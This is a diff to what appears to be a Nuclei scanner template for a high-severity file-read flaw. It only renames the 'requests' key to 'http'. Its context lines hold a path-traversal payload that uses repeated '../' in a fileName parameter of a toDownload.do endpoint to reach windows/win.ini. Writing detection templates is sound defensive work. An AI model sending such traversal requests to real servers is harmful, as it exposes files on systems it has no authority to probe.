@@ -6,7 +6,7 @@ info:
   severity: high
   tags: hst,fileRead
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini"
